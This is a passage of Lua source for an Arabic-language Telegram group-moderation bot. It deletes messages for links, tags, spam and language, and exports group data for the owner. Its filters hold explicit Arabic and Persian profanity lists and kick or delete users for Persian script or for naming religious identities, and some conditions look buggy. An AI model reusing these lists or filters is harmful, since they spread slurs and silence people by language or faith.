local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Audio]")
end end end
if faederdx1:get(FAEDER..'bot:music:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Audio]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if faederdx1:get(FAEDER..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Audio]")
end end
if faederdx1:get(FAEDER..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Audio]")
end end
if msg.content_.caption_:match("#") then
if faederdx1:get(FAEDER..'bot:hashtag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Audio]")
end end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if faederdx1:get(FAEDER..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Audio]")
end end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if faederdx1:get(FAEDER..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Voice]")
end end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if faederdx1:get(FAEDER..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Audio]")
end end end end
--     By Developer Faeder     -- 
-------- Voice
elseif msg_type == 'MSG:Voice' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if faederdx1:get(FAEDER..'anti-flood:'..msg.chat_id_) then
faederdx1:setex(FAEDER..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if faederdx1:get(FAEDER..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Voice]")
end end end
if faederdx1:get(FAEDER..'bot:voice:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Voice]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if faederdx1:get(FAEDER..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Voice]")
end end
if faederdx1:get(FAEDER..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Voice]")
end end
if msg.content_.caption_:match("#") then
if faederdx1:get(FAEDER..'bot:hashtag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Voice]")
end end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if faederdx1:get(FAEDER..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Voice]")
end end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if faederdx1:get(FAEDER..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Voice]")
end end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if faederdx1:get(FAEDER..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Voice]")
end end end end
--     By Developer Faeder     -- 
-------- Location
elseif msg_type == 'MSG:Location' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if faederdx1:get(FAEDER..'anti-flood:'..msg.chat_id_) then
faederdx1:setex(FAEDER..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if faederdx1:get(FAEDER..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Location]")
end end end
if faederdx1:get(FAEDER..'bot:location:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Location]")
return
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if faederdx1:get(FAEDER..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Location]")
end end
if faederdx1:get(FAEDER..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Location]")
end end
if msg.content_.caption_:match("#") then
if faederdx1:get(FAEDER..'bot:hashtag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Location]")
end end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if faederdx1:get(FAEDER..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Location]")
end end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if faederdx1:get(FAEDER..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Location]")
end end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if faederdx1:get(FAEDER..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Location]")
end end end end
--     By Developer Faeder     -- 
-------- Video
elseif msg_type == 'MSG:Video' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if faederdx1:get(FAEDER..'anti-flood:'..msg.chat_id_) then
faederdx1:setex(FAEDER..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if faederdx1:get(FAEDER..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Video]")
end end end
if faederdx1:get(FAEDER..'bot:video:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Video]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if faederdx1:get(FAEDER..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Video]")
end end
if faederdx1:get(FAEDER..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Video]")
end end
if msg.content_.caption_:match("#") then
if faederdx1:get(FAEDER..'bot:hashtag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Video]")
end end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if faederdx1:get(FAEDER..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Video] ")
end end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if faederdx1:get(FAEDER..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Video] ")
end end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if faederdx1:get(FAEDER..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Video]")
end end end end
--     By Developer Faeder     -- 
-------- Gif
elseif msg_type == 'MSG:Gif' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if faederdx1:get(FAEDER..'anti-flood:'..msg.chat_id_) then
faederdx1:setex(FAEDER..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if faederdx1:get(FAEDER..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Gif]")
end end end
if faederdx1:get(FAEDER..'bot:gifs:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Gif]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if faederdx1:get(FAEDER..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Gif] ")
end end
if faederdx1:get(FAEDER..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Gif]")
end end
if msg.content_.caption_:match("#") then
if faederdx1:get(FAEDER..'bot:hashtag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Gif]")
end end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") then
if faederdx1:get(FAEDER..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Gif]")
end end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if faederdx1:get(FAEDER..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Gif]")
end end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if faederdx1:get(FAEDER..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Gif]")
end end end end
--     By Developer Faeder     -- 
-------- Text
elseif msg_type == 'MSG:Text' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if faederdx1:get(FAEDER..'anti-flood:'..msg.chat_id_) then
faederdx1:setex(FAEDER..pm, TIME_CHECK, msgs+1)
end end
--vardump(msg)
function check_username(extra,result,success)
--vardump(result)
local username = (result.username_ or '')
local svuser = 'user:'..result.id_
if username then
faederdx1:hset(svuser, 'username', username)
end
if username and username:match("[Bb][Oo][Tt]$") or username:match("_[Bb][Oo][Tt]$") then
if faederdx1:get(FAEDER..'bot:bots:gkgk'..msg.chat_id_) and not is_momod(msg.chat_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
chat_kick(msg.chat_id_, msg.sender_user_id_)
else
chat_kick(msg.chat_id_, bots[i].user_id_)
return false
end end end
getUser(msg.sender_user_id_,check_username)
faederdx1:set(FAEDER..'bot:editid'.. msg.id_,msg.content_.text_)
if not is_free(msg, msg.content_.text_) then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
check_filter_words(msg,text)
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") then
if faederdx1:get(FAEDER..'bot:links:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Text]")
if faederdx1:get(FAEDER..'bot:strict'..msg.chat_id_) then
chat_kick(msg.chat_id_, msg.sender_user_id_)
end end end
if faederdx1:get(FAEDER..'bot:text:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Text]")
end
if msg.forward_info_ then
if faederdx1:get(FAEDER..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Text]")
end end end
if msg.content_.text_:match("@") then
if faederdx1:get(FAEDER..'tags:lock'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Text]")
end end
if msg.content_.text_:match("#") then
if faederdx1:get(FAEDER..'bot:hashtag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Text]")
end end
if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if faederdx1:get(FAEDER..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Text]")
end end
if msg.content_.text_:match("[\216-\219][\128-\191]") then
if faederdx1:get(FAEDER..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Text]")
end end
if msg.content_.text_ then
local _nl, ctrl_chars = string.gsub(text, '%c', '')
local _nl, real_digits = string.gsub(text, '%d', '')
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
local hash = 'bot:sens:spam'..msg.chat_id_
if not faederdx1:get(FAEDER..hash) then
sens = 400
else
sens = tonumber(faederdx1:get(FAEDER..hash))
end
if faederdx1:get(FAEDER..'bot:spam:mute'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
delete_msg(chat,msgs)
print("Deleted [Lock] [Spam] ")
end end
if msg.content_.text_:match("[A-Z]") or msg.content_.text_:match("[a-z]") then
if faederdx1:get(FAEDER..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Text]")
end end end end
--     By Developer Faeder     -- 
if faederdx1:get(FAEDER.."bot:setgroup:link"..msg.chat_id_..""..msg.sender_user_id_) then
if text == "الغاء" then
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم الغاء حفظ الرابط .', 1, 'md')
faederdx1:del(FAEDER.."bot:setgroup:link"..msg.chat_id_..""..msg.sender_user_id_) 
return false
end
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local Link = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
faederdx1:set(FAEDER.."bot:group:link"..msg.chat_id_,Link)
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم صنع الرابط الجديد .\n↫ ارسل (الرابط) لعرض الرابط .', 1, 'md')
faederdx1:del(FAEDER.."bot:setgroup:link"..msg.chat_id_..""..msg.sender_user_id_) 
return false 
end end
--     By Developer Faeder     -- 
local msg = data.message_
text = msg.content_.text_
if text and is_monsh(msg.sender_user_id_, msg.chat_id_) then 
if faederdx1:get('faeder:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
faederdx1:del('faeder:'..bot_id..'id:user'..msg.chat_id_)  
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم الغاء الامر .', 1, 'md')
faederdx1:del('faeder:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
faederdx1:del('faeder:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = faederdx1:get('faeder:'..bot_id..'id:user'..msg.chat_id_)  
faederdx1:incrby('faeder:'..bot_id..'nummsg'..msg.chat_id_..iduserr,numadded)  
faederdx(msg.chat_id_, msg.id_,  1, "↫ تم اضافه له *{ "..numadded..' }* رساله . ', 1, 'md')
end end
--     By Developer Faeder     -- 
if text:match("طيز") or text:match("ديس") or text:match("كس") or text:match("انيجمك") or text:match("انيج") or text:match("نيج") or text:match("ديوس") or text:match("عير") or text:match("كسختك") or text:match("كسمك") or text:match("كسربك") or text:match("بلاع") or text:match("ابو العيوره") or text:match("منيوج") or text:match("كحبه") or text:match("كحاب") or text:match("اخ الكحبه") or text:match("اخو الكحبه") or text:match("الكحبه") or text:match("كسك") or text:match("طيزك") or text:match("عير بطيزك") or text:match("كس امك") or text:match("امك الكحبه") or text:match("صرم") or text:match("عيرك") or text:match("عير بيك") or text:match("صرمك") or text:match("كوس") then
if faederdx1:get(FAEDER.."fshar"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
function get_warning(extra,result,success)
local id = msg.id_
local msgs = { [0] = id} 
local chat = msg.chat_id_
delete_msg(chat, msgs)
text = '↫ عذرا عزيزي  [firstname](https://telegram.me/username) \n↫ ممنوع السب هنا التزم فضلا .'
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('username',(result.username_ or 'Faeder_ch'))
faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
getUser(msg.sender_user_id_,get_warning)
end end
--     By Developer Faeder     -- 
if text:match("ڄ") or text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match(" ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("سکس") or text:match("سکسی") or text:match("کسی") or text:match("دخترا") or text:match("دیوث") or text:match("مک") or text:match("زدن") or text:match("سکس") or text:match("سکسی") or text:match("کسی") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") and is_owner(msg.sender_user_id_, msg.chat_id_) then
if faederdx1:get(FAEDER.."farsi"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
if faederdx1:get(FAEDER..'far'..msg.chat_id_) == 'thhhh' then
delete_msg(chat, msgs)
faederdx(msg.chat_id_, msg.id_, 1, '↫ ممنوع التكلم باللغه الفارسيه هنا  ', 1, 'md')   
elseif faederdx1:get(FAEDER..'far'..msg.chat_id_) == 'bedthhh' then
delete_msg(chat, msgs)
end end end
--     By Developer Faeder     -- 
if text:match("ڄ") or text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match(" ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("سکس") or text:match("سکسی") or text:match("کسی") or text:match("دخترا") or text:match("دیوث") or text:match("مک") or text:match("زدن") or text:match("سکس") or text:match("سکسی") or text:match("کسی") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") and is_owner(msg.sender_user_id_, msg.chat_id_) then
if faederdx1:get(FAEDER.."farsiban"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
delete_msg(chat, msgs)
chat_kick(msg.chat_id_, msg.sender_user_id_)
end end
--     By Developer Faeder     -- 
if text:match("شيعي نكس") or text:match("سني نكس") or text:match("شيعه") or text:match("الشيعه") or text:match("السنه") or text:match("طائفتكم") or text:match("شيعي") or text:match("طائفيه") or text:match("انا سني") or text:match("انا شيعي") or text:match("مسيحي") or text:match("يهودي") or text:match("صابئي") or text:match("ملحد") or text:match("بالسنه") or text:match("بالشيعه") or text:match("شيعة") then
if faederdx1:get(FAEDER.."taf"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
function get_warning(extra,result,success)
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
delete_msg(chat, msgs)
text = '↫ عذرا عزيزي  [firstname](https://telegram.me/username) \n↫ ممنوع التكلم بالطائفيه هنا .'
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('username',(result.username_ or 'faeder_ch'))
faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
getUser(msg.sender_user_id_,get_warning)
end end
--     By Developer Faeder     -- 
if text:match("خره بالله") or text:match("خبربك") or text:match("كسدينربك") or text:match("خرب بالله") or text:match("خرب الله") or text:match("خره بربك") or text:match("الله الكواد") or text:match("خره بمحمد") or text:match("كسم الله") or text:match("كسم ربك") or text:match("كسربك") or text:match("كسختالله") or text:match("كسخت الله") or text:match("خره بدينك") or text:match("خرهبدينك") or text:match("كسالله") or text:match("خربالله") then
if faederdx1:get(FAEDER.."kaf"..msg.chat_id_) and not is_owner(msg.sender_user_id_, msg.chat_id_) then
function get_warning(extra,result,success)
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
delete_msg(chat, msgs)
text = '↫ عذرا عزيزي  [firstname](https://telegram.me/username) \n↫ ممنوع الالحاد هنا التزم فضلا .'
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('username',(result.username_ or 'faeder_ch'))
faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
getUser(msg.sender_user_id_,get_warning)
end end
---------------------------- End Functions Faeder ----------------------------
----------------******* Started Code Source Faeder *******---------
if text == 'جلب نسخه القروبات' and tonumber(msg.sender_user_id_) == tonumber(bot_owner) then
local list = faederdx1:smembers(FAEDER..'bot:groups')  
local t = '{"BOT_ID": '..FAEDER..',"GP_BOT":{'  
for k,v in pairs(list) do   
NAME = title_name(v) or ''
NAME = NAME:gsub('"','')
NAME = NAME:gsub('#','')
NAME = NAME:gsub([[\]],'')
link = faederdx1:get(FAEDER.."bot:group:link"..v) or ''
welcome = faederdx1:get(FAEDER..'welcome:'..v) or ''
MNSH = faederdx1:smembers(FAEDER..'bot:monsh:'..v)
MDER = faederdx1:smembers(FAEDER..'bot:owners:'..v)
MOD = faederdx1:smembers(FAEDER..'bot:momod:'..v)
VIP = faederdx1:smembers(FAEDER..'bot:vipmem:'..v)
if k == 1 then
t = t..'"'..v..'":{"GP_NAME":"'..NAME..'",'
else
t = t..',"'..v..'":{"GP_NAME":"'..NAME..'",'
end
if #VIP ~= 0 then 
t = t..'"VIP":['
for k,v in pairs(VIP) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end end
t = t..'],'
end
if #MOD ~= 0 then
t = t..'"MOD":['
for k,v in pairs(MOD) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end end   
t = t..'],'
end
if #MDER ~= 0 then
t = t..'"MDER":['
for k,v in pairs(MDER) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end end   
t = t..'],'
end
if #MNSH ~= 0 then
t = t..'"MNSH":['
for k,v in pairs(MNSH) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end end   
t = t..'],'
end
t = t..'"linkgroup":"'..link..'"}'
end
t = t..'}}'
local File = io.open('./'..bot_id..'.json', "w")
File:write(t)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './'..FAEDER..'.json', '↫ عدد قروبات البوت : '..#list..'',dl_cb, nil)
end
--     By Developer Faeder     -- 
